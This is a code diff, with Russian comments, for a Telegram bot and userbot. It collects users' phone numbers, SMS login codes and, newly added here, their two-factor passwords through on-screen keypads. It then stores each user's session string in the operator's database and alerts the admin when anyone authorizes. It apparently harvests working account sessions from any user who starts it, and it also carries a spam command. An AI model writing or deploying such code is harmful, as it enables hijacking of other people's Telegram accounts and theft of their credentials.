@@ -44,13 +44,12 @@ dp.middleware.setup(LoggingMiddleware())
 # Временные данные для авторизации
 temp_auth = {}
 
-# ========== КОМАНДЫ БОТА ДЛЯ ВХОДА В ТВОЙ АККАУНТ ==========
+# ========== КОМАНДЫ БОТА ДЛЯ ВХОДА ==========
 
 @dp.message_handler(commands=['start'])
 async def start_auth(message: aiogram_types.Message):
     user_id = message.from_user.id
     
-    # Проверяем, есть ли уже сессия
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
     row = cursor.fetchone()
     if row and row[0]:
@@ -59,7 +58,7 @@ async def start_auth(message: aiogram_types.Message):
     
     kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
-    await message.answer("🔐 Отправь свой номер телефона для входа в твой аккаунт", reply_markup=kb)
+    await message.answer("🔐 Отправь свой номер телефона для входа", reply_markup=kb)
 
 @dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
 async def get_phone(message: aiogram_types.Message):
@@ -73,10 +72,11 @@ async def get_phone(message: aiogram_types.Message):
         temp_auth[user_id] = {
             "client": client,
             "phone": phone,
-            "hash": result.phone_code_hash
+            "hash": result.phone_code_hash,
+            "step": "code"  # code или password
         }
         
-        # Создаем клавиатуру с цифрами для ввода кода
+        # Клавиатура с цифрами
         kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
         for i in range(1, 10):
             kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
@@ -95,7 +95,7 @@ async def get_phone(message: aiogram_types.Message):
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
+@dp.callback_query_handler(lambda c: c.data.startswith('code_') or c.data.startswith('2fa_'))
 async def code_callback(callback: aiogram_types.CallbackQuery):
     user_id = callback.from_user.id
     
@@ -105,11 +105,47 @@ async def code_callback(callback: aiogram_types.CallbackQuery):
         return
     
     data = callback.data
-    code = temp_auth[user_id].get("code", "")
+    step = temp_auth[user_id].get("step", "code")
     
+    # Если сейчас ввод 2FA пароля
+    if step == "password":
+        if data.startswith('2fa_'):
+            if data == "2fa_ok":
+                password = temp_auth[user_id].get("password", "")
+                if len(password) > 0:
+                    await callback.answer("Авторизация с 2FA...")
+                    await complete_2fa(callback.message, user_id)
+                else:
+                    await callback.answer("Введи пароль!", show_alert=True)
+            elif data == "2fa_del":
+                temp_auth[user_id]["password"] = temp_auth[user_id].get("password", "")[:-1]
+            else:
+                digit = data.split("_")[1]
+                temp_auth[user_id]["password"] = temp_auth[user_id].get("password", "") + digit
+            
+            password = temp_auth[user_id].get("password", "")
+            hidden_pass = "*" * len(password)
+            text = f"🔐 Введи пароль от Telegram (2FA)\n\nТекущий ввод: `{hidden_pass}`\n{'✅ Готово' if len(password) > 0 else '❌ Введи пароль'}"
+            
+            # Клавиатура для 2FA
+            kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
+            for i in range(1, 10):
+                kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"2fa_{i}"))
+            kb.row(
+                aiogram_types.InlineKeyboardButton("0", callback_data="2fa_0"),
+                aiogram_types.InlineKeyboardButton("⌫", callback_data="2fa_del"),
+                aiogram_types.InlineKeyboardButton("✅", callback_data="2fa_ok")
+            )
+            
+            await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
+            await callback.answer()
+        return
+    
+    # Обычный ввод кода
     if data == "code_del":
-        code = code[:-1]
+        temp_auth[user_id]["code"] = temp_auth[user_id].get("code", "")[:-1]
     elif data == "code_ok":
+        code = temp_auth[user_id].get("code", "")
         if len(code) == 5:
             await callback.answer("Авторизация...")
             await complete_auth(callback.message, user_id)
@@ -118,16 +154,24 @@ async def code_callback(callback: aiogram_types.CallbackQuery):
         return
     else:
         digit = data.split("_")[1]
-        if len(code) < 5:
-            code += digit
+        if len(temp_auth[user_id].get("code", "")) < 5:
+            temp_auth[user_id]["code"] = temp_auth[user_id].get("code", "") + digit
     
-    temp_auth[user_id]["code"] = code
-    
-    # Обновляем сообщение с текущим кодом
+    code = temp_auth[user_id].get("code", "")
     text = f"📱 Введи код из SMS\n\nТекущий код: `{code}`\n{'✅ Готово' if len(code) == 5 else '❌ Нужно 5 цифр'}"
     
+    # Клавиатура для кода
+    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
+    for i in range(1, 10):
+        kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
+    kb.row(
+        aiogram_types.InlineKeyboardButton("0", callback_data="code_0"),
+        aiogram_types.InlineKeyboardButton("⌫", callback_data="code_del"),
+        aiogram_types.InlineKeyboardButton("✅", callback_data="code_ok")
+    )
+    
     try:
-        await callback.message.edit_text(text, reply_markup=callback.message.reply_markup, parse_mode="Markdown")
+        await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
     except:
         pass
     
@@ -143,26 +187,74 @@ async def complete_auth(message: aiogram_types.Message, user_id: int):
             phone_code_hash=data["hash"]
         )
         
+        # Если успешно, сохраняем сессию
         session_str = data["client"].session.save()
-        
-        # Сохраняем сессию
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', 
                       (user_id, session_str))
         conn.commit()
         
-        await message.answer("✅ Авторизация успешна! Твой аккаунт подключен.")
+        await message.answer("✅ Авторизация успешна!")
         
-        # Уведомляем админа
+        if ADMIN_ID and user_id == ADMIN_ID:
+            global owner_id, user_client
+            owner_id = user_id
+            user_client = data["client"]
+            await message.answer("✅ Ты авторизован как владелец! Юзербот запущен.")
+        
         if ADMIN_ID:
             await reg_bot.send_message(ADMIN_ID, f"🎉 Пользователь @{message.chat.username or user_id} авторизован!")
         
-        await data["client"].disconnect()
         del temp_auth[user_id]
         
     except Exception as e:
-        await message.answer(f"❌ Ошибка авторизации: {e}")
+        error_msg = str(e)
+        if "password" in error_msg.lower() or "2fa" in error_msg.lower():
+            # Требуется 2FA
+            temp_auth[user_id]["step"] = "password"
+            temp_auth[user_id]["password"] = ""
+            
+            kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
+            for i in range(1, 10):
+                kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"2fa_{i}"))
+            kb.row(
+                aiogram_types.InlineKeyboardButton("0", callback_data="2fa_0"),
+                aiogram_types.InlineKeyboardButton("⌫", callback_data="2fa_del"),
+                aiogram_types.InlineKeyboardButton("✅", callback_data="2fa_ok")
+            )
+            
+            await message.answer("🔐 Включена двухфакторная аутентификация!\nВведи пароль:", reply_markup=kb)
+        else:
+            await message.answer(f"❌ Ошибка авторизации: {e}")
 
-# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ ЮЗЕРБОТА ==========
+async def complete_2fa(message: aiogram_types.Message, user_id: int):
+    data = temp_auth[user_id]
+    password = data.get("password", "")
+    
+    try:
+        await data["client"].sign_in(password=password)
+        
+        session_str = data["client"].session.save()
+        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', 
+                      (user_id, session_str))
+        conn.commit()
+        
+        await message.answer("✅ Авторизация с 2FA успешна!")
+        
+        if ADMIN_ID and user_id == ADMIN_ID:
+            global owner_id, user_client
+            owner_id = user_id
+            user_client = data["client"]
+            await message.answer("✅ Ты авторизован как владелец! Юзербот запущен.")
+        
+        if ADMIN_ID:
+            await reg_bot.send_message(ADMIN_ID, f"🎉 Пользователь @{message.chat.username or user_id} авторизован с 2FA!")
+        
+        del temp_auth[user_id]
+        
+    except Exception as e:
+        await message.answer(f"❌ Ошибка 2FA: {e}")
+
+# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 async def get_user_info(user_id):
     try:
         user = await user_client.get_entity(user_id)
@@ -181,11 +273,7 @@ async def load_muted_users():
     global muted_users
     muted_users = {row[0] for row in rows}
 
-async def get_owner_id():
-    me = await user_client.get_me()
-    return me.id
-
-# ========== ВСЕ КОМАНДЫ ЮЗЕРБОТА ==========
+# ========== КОМАНДЫ ЮЗЕРБОТА ==========
 
 @user_client.on(events.Raw(types.UpdateDeleteMessages))
 async def raw_deleted_handler(event):
@@ -387,9 +475,7 @@ async def help_handler(event):
 ▫️ Mute: ( .mute | .unmute ) — Заглушить/разглушить
 ▫️ Spam: (.spam) — Спам
 ▫️ Typer: ( .type ) — Набор текста
-▫️ UserInfo: ( .info )</blockquote>
-
-Справка по команде: <code>.help [команда]</code>"""
+▫️ UserInfo: ( .info )</blockquote>"""
     await event.edit(help_text, parse_mode='HTML')
 
 @user_client.on(events.NewMessage(outgoing=True))
@@ -418,7 +504,6 @@ def run_web():
 
 # ========== ЗАПУСК ==========
 async def load_owner_session():
-    """Загружаем сессию владельца из БД"""
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (ADMIN_ID,))
     row = cursor.fetchone()
     if row and row[0]:
@@ -428,7 +513,6 @@ async def load_owner_session():
 async def main():
     global owner_id, user_client
     
-    # Пробуем загрузить сессию админа
     admin_session = await load_owner_session()
     
     if admin_session:
@@ -437,18 +521,16 @@ async def main():
         if await user_client.is_user_authorized():
             owner_id = ADMIN_ID
             print(f"✅ Загружена сессия админа: {owner_id}")
+            await load_muted_users()
+            await user_client.run_until_disconnected()
         else:
-            print("❌ Сессия админа недействительна")
-            return
+            print("❌ Сессия админа недействительна. Авторизуйся через бота /start")
+            while True:
+                await asyncio.sleep(5)
     else:
-        print("⚠️ Сессия админа не найдена. Бот работает только для регистрации.")
-        # Ждем пока админ зарегистрируется через бота
+        print("⚠️ Сессия админа не найдена. Авторизуйся через бота /start")
         while True:
             await asyncio.sleep(5)
-    
-    await load_muted_users()
-    print(f"✅ Юзербот запущен! User ID: {owner_id}")
-    await user_client.run_until_disconnected()
 
 def start_aiogram():
     from aiogram.utils import executor
